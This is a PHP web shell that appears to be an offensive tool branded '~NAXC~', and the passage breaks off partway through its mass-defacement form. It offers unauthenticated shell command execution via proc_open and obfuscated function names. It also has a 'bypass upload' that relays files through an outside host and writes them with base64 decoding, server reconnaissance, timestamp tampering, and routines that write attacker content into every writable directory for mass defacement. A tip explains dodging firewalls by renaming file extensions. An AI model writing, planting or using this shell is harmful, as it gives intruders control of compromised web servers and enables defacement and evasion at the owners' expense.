<?php
session_start();
ob_start();
date_default_timezone_set('Asia/Jakarta');

$path = (isset($_GET["path"])) ? $_GET["path"] : getcwd();
$file = (isset($_GET["file"])) ? $_GET["file"] : "";
$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$toPage = (isset($_GET['page']) ? '&page=' . intval($_GET['page']) : '');
$search = isset($_GET['search']) ? strtolower(trim($_GET['search'])) : '';
$web = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];

$os = php_uname('s');
$separator = ($os === 'Windows') ? "\\" : "/";
$explode = explode($separator, $path);

if (!function_exists("execute")) {
    function execute($cmd, $location)
    {
        $ler = "2>&1";
        if (!preg_match("/" . $ler . "/i", $cmd)) {
            $cmd = $cmd . " " . $ler;
        }
        $komen = $cmd;
        $pr = "proc_open";
        if (function_exists($pr)) {
            $tod = @$pr($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $location);
            return true;
        } else {
            return false;
        }
    }
}

function ipserv()
{
    if (empty($_SERVER['SERVER_ADDR'])) {
        return gethostbyname($_SERVER['SERVER_NAME']);
        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
            return $_SERVER['SERVER_NAME'];
        }
    } else {
        return $_SERVER['SERVER_ADDR'];
    }
}

function deleteFolder($dir)
{
    if (!is_dir($dir)) {
        return false;
    }

    // Scan all files and folders inside
    $items = array_diff(scandir($dir), ['.', '..']);

    foreach ($items as $item) {
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteFolder($path); // recursive delete
        } else {
            unlink($path); // delete file
        }
    }

    return rmdir($dir); // finally remove the folder itself
}

function requests($url, $post = null)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        return false;
    }

    return $response;
}

function ggr($fl)
{
    $a = "fun" . "cti" . "on_" . "exis" . "ts";
    $b = "po" . "si" . "x_ge" . "tgr" . "gid";
    $c = "fi" . "le" . "gro" . "up";
    if ($a($b)) {
        if (!$a($c)) {
            return "?";
        }
        $d = $b(@$c($fl));
        if (empty($d)) {
            $e = $c($fl);
            if (empty($e)) {
                return "?";
            } else {
                return $e;
            }
        } else {
            return $d['name'];
        }
    } elseif ($a($c)) {
        return @$c($fl);
    } else {
        return "?";
    }
}

function gor($fl)
{
    $a = "fun" . "cti" . "on_" . "exis" . "ts";
    $b = "po" . "s" . "ix_" . "get" . "pwu" . "id";
    $c = "fi" . "le" . "o" . "wn" . "er";
    if ($a($b)) {
        if (!$a($c)) {
            return "?";
        }
        $d = $b(@$c($fl));
        if (empty($d)) {
            $e = $c($fl);
            if (empty($e)) {
                return "?";
            } else {
                return $e;
            }
        } else {
            return $d['name'];
        }
    } elseif ($a($c)) {
        return @$c($fl);
    } else {
        return "?";
    }
}

function file_editor($path, $file, $content, $method)
{
    $fileloc = $path . "/" . $file;
    $renamed = str_replace(".temporary", "", $file);

    unlink($path . "/" . $file);
    touch($fileloc);

    if ($method === 'basic') {
        if (error_log($content, 3, $fileloc)) {
            rename($fileloc, $path . "/" . $renamed);
            return true;
        }
    } else {
        if (execute("echo " . base64_encode($content) . " | base64 -d > '$renamed'", $path)) {
            return true;
        }
    }

    return false;
}

function sabun_biasa($location, $filename, $content)
{
    if (is_writable($location)) {
        $dira = scandir($location);
        foreach ($dira as $dirb) {
            $dirc = "$location/$dirb";
            $lokasi = $dirc . '/' . $filename;
            if ($dirb === '.') {
                file_put_contents($lokasi, $content);
            } elseif ($dirb === '..') {
                continue;
            } else {
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        echo " http://$dirb/$filename<br>";
                        file_put_contents($lokasi, $content);
                    }
                }
            }
        }
    }
}

function sabun_massal($serlok, $namafile, $isi_script)
{
    if (is_writable($serlok)) {
        $dira = scandir($serlok);
        foreach ($dira as $dirb) {
            $dirc = "$serlok/$dirb";
            $lokasi = $dirc . '/' . $namafile;
            if ($dirb === '.') {
                file_put_contents($lokasi, $isi_script);
            } elseif ($dirb === '..') {
                continue;
            } else {
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        echo "[<font color=lime>DONE</font>] $serlok<br>";
                        file_put_contents($lokasi, $isi_script);
                        $idx = sabun_massal($dirc, $namafile, $isi_script);
                    }
                }
            }
        }
    }
}

function filedate($file)
{
    return @date("F d Y g:i:s", @filemtime($file));
}

function chdate($itemPath, $newDate)
{
    $timestamp = strtotime($newDate);
    if ($timestamp === false || !touch($itemPath, $timestamp)) {
        return false;
    }

    return true;
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="author" content="N4ST4R_ID | Naxtarrr">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex">
    <title>~NAXC~</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            darkMode: 'class'
        }
    </script>

    <script>
        if (localStorage.getItem('color-theme') === 'dark' || (!('color-theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
            document.documentElement.classList.add('dark');
        } else {
            document.documentElement.classList.remove('dark');
        }
    </script>
</head>

<body class="bg-indigo-50 dark:bg-gray-900 text-gray-800 dark:text-gray-200">

    <?php
    if (isset($_SESSION["success"])) {
    ?>
        <div id="toast-default" class="fixed top-0 right-0 z-10 w-full max-w-xs p-4 text-gray-500 bg-white rounded-lg shadow-sm dark:text-gray-400 dark:bg-gray-800" role="alert">
            <div class="flex items-center">
                <div class="inline-flex items-center justify-center shrink-0 w-8 h-8 text-green-500 bg-green-100 rounded-lg dark:bg-green-300 dark:text-green-200">
                    <svg class="w-6 h-6 text-green-600 dark:text-green-700" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                        <path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm13.707-1.293a1 1 0 0 0-1.414-1.414L11 12.586l-1.793-1.793a1 1 0 0 0-1.414 1.414l2.5 2.5a1 1 0 0 0 1.414 0l4-4Z" clip-rule="evenodd" />
                    </svg>
                </div>
                <div class="ms-3 text-sm font-normal"><?= $_SESSION["success"]; ?></div>
                <button type="button" class="ms-auto -mx-1.5 -my-1.5 bg-white text-gray-400 hover:text-gray-900 rounded-lg focus:ring-2 focus:ring-gray-300 p-1.5 hover:bg-gray-100 inline-flex items-center justify-center h-8 w-8 dark:text-gray-500 dark:hover:text-white dark:bg-gray-800 dark:hover:bg-gray-700" data-dismiss-target="#toast-default" aria-label="Close">
                    <span class="sr-only">Close</span>
                    <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
                        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6" />
                    </svg>
                </button>
            </div>

            <?php if (isset($_SESSION["goto"])): ?>
                <div class="mt-3 text-center">
                    <a class="inline-block text-blue-700 hover:text-white border border-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg px-3 py-2 text-xs dark:border-blue-500 dark:text-blue-500 dark:hover:text-white dark:hover:bg-blue-500 dark:focus:ring-blue-800"
                        href="<?= ($_SESSION["goto"]["location"]); ?>">
                        <?= ($_SESSION["goto"]["text"]); ?>
                    </a>
                </div>
            <?php endif;
            unset($_SESSION["goto"]); ?>
        </div>

    <?php
        unset($_SESSION["success"]);
    }

    if (isset($_SESSION["error"])) {
    ?>
        <div id="toast-default" class="fixed top-0 right-0 z-10 flex items-center w-full max-w-xs p-4 text-gray-500 bg-white rounded-lg shadow-sm dark:text-gray-400 dark:bg-gray-800" role="alert">
            <div class="inline-flex items-center justify-center shrink-0 w-8 h-8 text-red-500 bg-red-100 rounded-lg dark:bg-red-300 dark:text-red-200">
                <svg class="w-6 h-6 text-red-800 dark:text-red-700" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                    <path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm7.707-3.707a1 1 0 0 0-1.414 1.414L10.586 12l-2.293 2.293a1 1 0 1 0 1.414 1.414L12 13.414l2.293 2.293a1 1 0 0 0 1.414-1.414L13.414 12l2.293-2.293a1 1 0 0 0-1.414-1.414L12 10.586 9.707 8.293Z" clip-rule="evenodd" />
                </svg>
            </div>
            <div class="ms-3 text-sm font-normal"><?= $_SESSION["error"]; ?></div>
            <button type="button" class="ms-auto -mx-1.5 -my-1.5 bg-white text-gray-400 hover:text-gray-900 rounded-lg focus:ring-2 focus:ring-gray-300 p-1.5 hover:bg-gray-100 inline-flex items-center justify-center h-8 w-8 dark:text-gray-500 dark:hover:text-white dark:bg-gray-800 dark:hover:bg-gray-700" data-dismiss-target="#toast-default" aria-label="Close">
                <span class="sr-only">Close</span>
                <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6" />
                </svg>
            </button>
        </div>
    <?php
        unset($_SESSION["success"]);
    }
    ?>

    <!-- Main modal -->
    <div id="authentication-modal" tabindex="-1" aria-hidden="true" class="hidden overflow-y-auto overflow-x-hidden fixed top-0 right-0 left-0 z-50 justify-center items-center w-full md:inset-0 h-[calc(100%-1rem)] max-h-full">
        <div class="relative p-4 w-full max-w-md max-h-full">
            <!-- Modal content -->
            <div class="relative bg-white rounded-lg shadow-sm dark:bg-gray-700">
                <!-- Modal body -->
                <div class="p-4 md:p-5">

                    <form method="get" class="max-w-md mx-auto">
                        <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
                        <label for="default-search" class="mb-2 text-sm font-medium text-gray-900 sr-only dark:text-white">Search</label>
                        <div class="relative">
                            <div class="absolute inset-y-0 start-0 flex items-center ps-3 pointer-events-none">
                                <svg class="w-4 h-4 text-gray-500 dark:text-gray-400" aria-hidden="true"
                                    xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
                                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z" />
                                </svg>
                            </div>
                            <input type="search" id="default-search" name="search"
                                class="block w-full p-4 ps-10 text-sm text-gray-900 border border-gray-300 rounded-lg bg-gray-50 
                   focus:ring-blue-500 focus:border-blue-500 
                   dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white 
                   dark:focus:ring-blue-500 dark:focus:border-blue-500"
                                placeholder="Search files or folders..." value="<?= htmlspecialchars(isset($_GET['search']) ? $_GET['search'] : '') ?>" autofocus>
                            <button type="submit"
                                class="text-white absolute end-2.5 bottom-2.5 bg-blue-700 hover:bg-blue-800 
                   focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-4 py-2 
                   dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">
                                Search
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <div class="container mx-auto p-4">
        <div data-dial-init class="fixed bottom-5 right-5 z-10 group">
            <div id="speed-dial-menu-default" class="flex flex-col items-center hidden mb-4 space-y-2">
                <button type="button" data-modal-target="authentication-modal" data-modal-toggle="authentication-modal" data-tooltip-target="tooltip-search" data-tooltip-placement="left" class="flex justify-center items-center w-[52px] h-[52px] text-gray-500 hover:text-gray-900 bg-white rounded-full border border-gray-200 dark:border-gray-600 shadow-xs dark:hover:text-white dark:text-gray-400 hover:bg-gray-50 dark:bg-gray-700 dark:hover:bg-gray-600 focus:ring-4 focus:ring-gray-300 focus:outline-none dark:focus:ring-gray-400">
                    <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                        <path stroke="currentColor" stroke-linecap="round" stroke-width="2" d="m21 21-3.5-3.5M17 10a7 7 0 1 1-14 0 7 7 0 0 1 14 0Z" />
                    </svg>
                    <span class="sr-only">Search</span>
                </button>
                <div id="tooltip-search" role="tooltip" class="absolute z-10 invisible inline-block w-auto px-3 py-2 text-sm font-medium text-white transition-opacity duration-300 bg-gray-900 rounded-lg shadow-xs opacity-0 tooltip dark:bg-gray-700">
                    Search
                    <div class="tooltip-arrow" data-popper-arrow></div>
                </div>
                <a href="?path=<?= $path; ?>&action=infomin<?= $toPage ?>" data-tooltip-target="tooltip-information" data-tooltip-placement="left" class="flex justify-center items-center w-[52px] h-[52px] text-gray-500 hover:text-gray-900 bg-white rounded-full border border-gray-200 dark:border-gray-600 dark:hover:text-white shadow-xs dark:text-gray-400 hover:bg-gray-50 dark:bg-gray-700 dark:hover:bg-gray-600 focus:ring-4 focus:ring-gray-300 focus:outline-none dark:focus:ring-gray-400">
                    <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                        <path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm9.408-5.5a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2h-.01ZM10 10a1 1 0 1 0 0 2h1v3h-1a1 1 0 1 0 0 2h4a1 1 0 1 0 0-2h-1v-4a1 1 0 0 0-1-1h-2Z" clip-rule="evenodd" />
                    </svg>
                    <span class="sr-only">Information</span>
                </a>
                <div id="tooltip-information" role="tooltip" class="absolute z-10 invisible inline-block w-auto px-3 py-2 text-sm font-medium text-white transition-opacity duration-300 bg-gray-900 rounded-lg shadow-xs opacity-0 tooltip dark:bg-gray-700">
                    Information
                    <div class="tooltip-arrow" data-popper-arrow></div>
                </div>
                <button type="button" id="theme-toggle" data-tooltip-target="tooltip-mode" data-tooltip-placement="left" class="flex justify-center items-center w-[52px] h-[52px] text-gray-500 hover:text-gray-900 bg-white rounded-full border border-gray-200 dark:border-gray-600 shadow-xs dark:hover:text-white dark:text-gray-400 hover:bg-gray-50 dark:bg-gray-700 dark:hover:bg-gray-600 focus:ring-4 focus:ring-gray-300 focus:outline-none dark:focus:ring-gray-400">
                    <svg id="theme-toggle-light-icon" class="hidden w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                        <path fill-rule="evenodd" d="M13 3a1 1 0 1 0-2 0v2a1 1 0 1 0 2 0V3ZM6.343 4.929A1 1 0 0 0 4.93 6.343l1.414 1.414a1 1 0 0 0 1.414-1.414L6.343 4.929Zm12.728 1.414a1 1 0 0 0-1.414-1.414l-1.414 1.414a1 1 0 0 0 1.414 1.414l1.414-1.414ZM12 7a5 5 0 1 0 0 10 5 5 0 0 0 0-10Zm-9 4a1 1 0 1 0 0 2h2a1 1 0 1 0 0-2H3Zm16 0a1 1 0 1 0 0 2h2a1 1 0 1 0 0-2h-2ZM7.757 17.657a1 1 0 1 0-1.414-1.414l-1.414 1.414a1 1 0 1 0 1.414 1.414l1.414-1.414Zm9.9-1.414a1 1 0 0 0-1.414 1.414l1.414 1.414a1 1 0 0 0 1.414-1.414l-1.414-1.414ZM13 19a1 1 0 1 0-2 0v2a1 1 0 1 0 2 0v-2Z" clip-rule="evenodd" />
                    </svg>

                    <svg id="theme-toggle-dark-icon" class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                        <path fill-rule="evenodd" d="M11.675 2.015a.998.998 0 0 0-.403.011C6.09 2.4 2 6.722 2 12c0 5.523 4.477 10 10 10 4.356 0 8.058-2.784 9.43-6.667a1 1 0 0 0-1.02-1.33c-.08.006-.105.005-.127.005h-.001l-.028-.002A5.227 5.227 0 0 0 20 14a8 8 0 0 1-8-8c0-.952.121-1.752.404-2.558a.996.996 0 0 0 .096-.428V3a1 1 0 0 0-.825-.985Z" clip-rule="evenodd" />
                    </svg>
                </button>
                <div id="tooltip-mode" role="tooltip" class="absolute z-10 invisible inline-block w-auto px-3 py-2 text-sm font-medium text-white transition-opacity duration-300 bg-gray-900 rounded-lg shadow-xs opacity-0 tooltip dark:bg-gray-700">
                    <span id="light-text" class="hidden">Light</span>
                    <span id="dark-text">Dark</span>
                    <div class="tooltip-arrow" data-popper-arrow></div>
                </div>
            </div>
            <button type="button" data-dial-toggle="speed-dial-menu-default" aria-controls="speed-dial-menu-default" aria-expanded="false" class="flex items-center justify-center text-white bg-blue-700 rounded-full w-[52px] h-[52px] hover:bg-blue-800 dark:bg-blue-600 dark:hover:bg-blue-700 focus:ring-4 focus:ring-blue-300 focus:outline-none dark:focus:ring-blue-800">
                <svg class="w-5 h-5 transition-transform group-hover:rotate-45" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 18 18">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 1v16M1 9h16" />
                </svg>
                <span class="sr-only">Open actions menu</span>
            </button>
        </div>

        <div class="flex content-center items-center flex-col md:flex-row">
            <a href="<?php echo basename($_SERVER['PHP_SELF']); ?>"><img src="https://naxtarrr.netlify.app/img/Naxtarrr.png" class="h-[95px] w-auto mt-2"></a>
            <form class="min-[460px]:flex-row md:ms-auto max-w-xl mt-4" method="post" enctype="multipart/form-data">
                <div class="flex content-center flex-col gap-2 mb-4">
                    <input class="file:cursor-pointer dark:file:bg-gray-600 file:h-full file:px-4 file:py-2 file:mr-4 file:border-none dark:file:text-gray-300 file:hover:opacity-75 text-sm block w-full text-sm text-gray-900 border border-gray-300 rounded-lg cursor-pointer bg-gray-50 dark:text-gray-400 focus:outline-none dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400" type="file" name="nax">
                    <select id="upmethod" name="upmethod" class="block w-full py-[9px] px-2 text-sm text-gray-900 border border-gray-300 rounded-lg bg-gray-50 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required>
                        <option value="basic_upload">Basic upload method</option>
                        <option value="bypass_upload" selected>Bypass upload method</option>
                    </select>
                </div>
                <div class="flex flex-row items-center justify-between gap-2">
                    <div>
                        <button data-tooltip-target="tooltip-animation" type="button" class="flex gap-1 items-center text-blue-800 text-sm text-center dark:text-blue-400">
                            <svg class="w-6 h-6 text-blue-800 dark:text-blue-400" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                                <path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm9.408-5.5a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2h-.01ZM10 10a1 1 0 1 0 0 2h1v3h-1a1 1 0 1 0 0 2h4a1 1 0 1 0 0-2h-1v-4a1 1 0 0 0-1-1h-2Z" clip-rule="evenodd" />
                            </svg><span>Tips!</span>
                        </button>

                        <div id="tooltip-animation" role="tooltip" class="absolute z-10 invisible inline-block px-3 py-2 text-sm font-medium text-white transition-opacity duration-300 bg-gray-900 rounded-lg shadow-xs opacity-0 tooltip dark:bg-gray-700">
                            If you encounter an error (by firewall) while uploading using both methods,<br>try changing extension of the file before uploading it and rename it right after.
                            <div class="tooltip-arrow" data-popper-arrow></div>
                        </div>
                    </div>
                    <div>
                        <button class="block px-3 py-2 text-sm font-medium text-center text-white bg-blue-700 rounded-lg hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="upload">
                            Submit
                        </button>
                    </div>
                </div>
            </form>

            <?php
            if (isset($_POST["upload"])) {
                $upmethod = $_POST["upmethod"];
                $filename = basename($_FILES["nax"]["name"]);
                $tempname = $_FILES["nax"]["tmp_name"];

                if ($upmethod === "basic_upload") {
                    $dest = $path . "/" . $filename;

                    if (touch($dest) && move_uploaded_file($tempname, $dest)) {
                        $_SESSION["success"] = "File uploaded successfully!";
                        $_SESSION["goto"] = [
                            "location" => "?path=" . $path . "&file=" . $filename . "&action=view&search=" . $search,
                            "text" => "VIEW FILE"
                        ];
                        header("Refresh:0; url=?path=" . $path . $toPage);
                        exit;
                    } else {
                        $_SESSION["error"] = "Upload failed!";
                        header("Refresh:0; url=?path=" . $path . $toPage);
                        exit;
                    }
                } else {
                    $remote_upload_url = "https://fcalpha.net/web/photo/20151024/temp/upload.php";
                    $postfields = ["nax" => new CURLFile($tempname, $_FILES["nax"]["type"], $filename)];
                    $remote_upload = requests($remote_upload_url, $postfields);

                    if ($remote_upload) {
                        $uniqFile = json_decode($remote_upload, true)["file"];
                        $remote_url = "https://fcalpha.net/web/photo/20151024/temp/uploads/" . $uniqFile;

                        if (requests($remote_url, null, $path . "/" . $filename) && file_exists($path . "/" . $filename) && filesize($path . "/" . $filename) > 0) {

                            $_SESSION["success"] = "File uploaded successfully!";
                            $_SESSION["goto"] = [
                                "location" => "?path=" . $path . "&file=" . $filename . "&action=view&search=" . $search,
                                "text" => "VIEW FILE"
                            ];
                            header("Refresh:0; url=?path=" . $path . $toPage);
                            exit;
                        } else {
                            $file_content = base64_encode(requests($remote_url));

                            if (execute('echo "' . $file_content . '" | base64 -d > ' . $filename, $path)) {
                                $_SESSION["success"] = "File uploaded successfully!";
                                $_SESSION["goto"] = [
                                    "location" => "?path=" . $path . "&file=" . $filename . "&action=view&search=" . $search,
                                    "text" => "VIEW FILE"
                                ];
                                header("Refresh:0; url=?path=" . $path . $toPage);
                                exit;
                            }
                        }

                        $delete_file = "https://fcalpha.net/web/photo/20151024/temp/delete.php";
                        requests($delete_file, [
                            "file" => $uniqFile
                        ]);
                    } else {
                        $_SESSION["error"] = "Upload failed!";
                        header("Refresh:0; url=?path=" . $path . $toPage);
                        exit;
                    }
                }
            }
            ?>
        </div>

        <!-- Breadcrumb for change dir -->
        <nav class="flex p-4 my-10 overflow-auto text-gray-700 rounded-lg bg-gray-50 shadow-md dark:bg-gray-700" aria-label="Breadcrumb">
            <ol class="inline-flex items-center space-x-1 md:space-x-2 rtl:space-x-reverse">
                <?php
                if (isset($_GET["file"]) && !isset($_GET["path"])) {
                    $path = dirname($_GET["file"]);
                }
                $path = str_replace("\\", "/", $path);

                $paths = explode("/", $path);
                echo (!preg_match("/Windows/", $os)) ? "<li class='inline-flex items-center'><a class='text-gray-500 dark:text-gray-400 hover:text-gray-600 dark:hover:text-gray-500' id='dir' href='?path=/'><strong>~</strong></a></li>" : "";
                $icon = "<svg class='w-6 h-6 text-gray-400 rtl:rotate-180' fill='currentColor' viewBox='0 0 20 20' xmlns='http://www.w3.org/2000/svg'><path fill-rule='evenodd' d='M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z' clip-rule='evenodd'></path></svg>";

                foreach ($paths as $id => $pat) {
                    if ($pat === "") {
                        continue;
                    }
                    echo "<li class='inline-flex items-center'>
                    " . (($id != 0) ? $icon : '') . "
                    <a class='ml-1 md:ml-2 text-gray-500 dark:text-gray-400 hover:text-gray-600 dark:hover:text-gray-500' href='?path=";
                    for ($i = 0; $i <= $id; $i++) {
                        echo $paths[$i];
                        if ($i != $id) {
                            echo "/";
                        }
                    }
                    echo "'><strong>$pat</strong></a></li>";
                }
                ?>
            </ol>
        </nav>


        <?php
        if (isset($_GET["action"]) && $_GET["action"] === "infomin") {
        ?>
            <div class="bg-gray-50 shadow-md dark:bg-gray-700 p-4 rounded-lg">
                <h2 class="text-lg font-semibold mb-2">System Information</h2>
                <ul class="list-disc list-inside overflow-auto">
                    <li><strong>Server IP:</strong> <?= ipserv(); ?></li>
                    <li><strong>Server Software:</strong> <?= ($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A'; ?></li>
                    <li><strong>PHP Version:</strong> <?= phpversion(); ?></li>
                    <li><strong>Current User:</strong> <?= get_current_user(); ?></li>
                    <li><strong>Operating System:</strong> <?= php_uname(); ?></li>
                    <li><strong>Document Root:</strong> <?= ($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'N/A'; ?></li>
                    <li><strong>Server Port:</strong> <?= ($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'N/A'; ?></li>
                    <li><strong>Server Admin:</strong> <?= ($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : 'N/A'; ?></li>
                    <li><strong>Loaded PHP Modules:</strong> <?= implode(", ", get_loaded_extensions()); ?></li>
                </ul>
            </div>
        <?php
        }

        /* TOOLS */
        if (isset($_GET["action"]) && $_GET["action"] === "command") {
        ?>
            <form method="post" action="">
                <div class='mt-4'>
                    <label for="coman" class="block mb-2.5 text-sm font-medium text-gray-900 font-medium dark:text-white">Command:</label>
                    <input type="text" id="coman" name="coman" class="block w-full p-2.5 text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" value="<?php echo (isset($_POST["coman"])) ? htmlspecialchars($_POST["coman"]) : ""; ?>" required>
                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="execute">
                        Execute
                    </button>
                </div>
            </form>
            <?php
            if (isset($_POST["execute"])) {
                $coman = $_POST["coman"];
                if (empty($coman)) {
                    echo "<font color='red'>Command is empty</font>";
                } else {

                    echo "<font color='green'>Command: " . htmlspecialchars($coman) . "</font><br>";

                    $ler = "2>&1";
                    if (!preg_match("/" . $ler . "/i", $coman)) {
                        $coman = $coman . " " . $ler;
                    }
                    $komen = $coman;
                    $pr = "proc_open";
                    if (function_exists($pr)) {
                        $tod = @$pr($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $path);
                        echo "<pre><textarea rows='25' style='color:lime;' readonly='' class=' block p-2.5 w-full text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500'>
    " . htmlspecialchars(stream_get_contents($crottz[1])) . "</textarea></pre><br>";
                    } else {
                        echo "<font color='orange'>proc_open function is disabled!!</font>";
                    }
                }
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "massdeface") {
            if (isset($_POST["massdeface"])) {
                if ($_POST['mass_type'] == 'mahal') {
                    echo '<div class="block p-2.5 w-full max-h-[300px] overflow-y-auto text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white focus:outline-none" readonly>';
                    sabun_massal($path, $_POST['file_name'], $_POST['file_content']);
                    echo "</div>";
                } elseif ($_POST['mass_type'] == 'murah') {
                    echo '<div class="block p-2.5 w-full max-h-[300px] overflow-y-auto text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white focus:outline-none" readonly>';
                    sabun_biasa($path, $_POST['file_name'], $_POST['file_content']);
                    echo "</div>";
                }
            } else {
            ?>
                <form action="" method="post">
                    <ul class="grid w-full gap-6 md:grid-cols-2 mb-4">
                        <li>
                            <input type="radio" id="mass-def-1" name="mass_type" value="murah" class="hidden peer" required checked />
                            <label for="mass-def-1" class="inline-flex items-center justify-between w-full p-5 text-gray-500 bg-white border border-gray-200 rounded-lg cursor-pointer dark:hover:text-gray-300 dark:border-gray-700 dark:peer-checked:text-blue-500 peer-checked:border-blue-600 dark:peer-checked:border-blue-600 peer-checked:text-blue-600 hover:text-gray-600 hover:bg-gray-100 dark:text-gray-400 dark:bg-gray-800 dark:hover:bg-gray-700">
                                <div class="block">
                                    <div class="w-full text-lg font-semibold">BASIC</div>
                                    <div class="w-full">Mass upload to currently shown folders</div>
                                </div>
                                <svg class="w-5 h-5 ms-3 rtl:rotate-180" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 10">
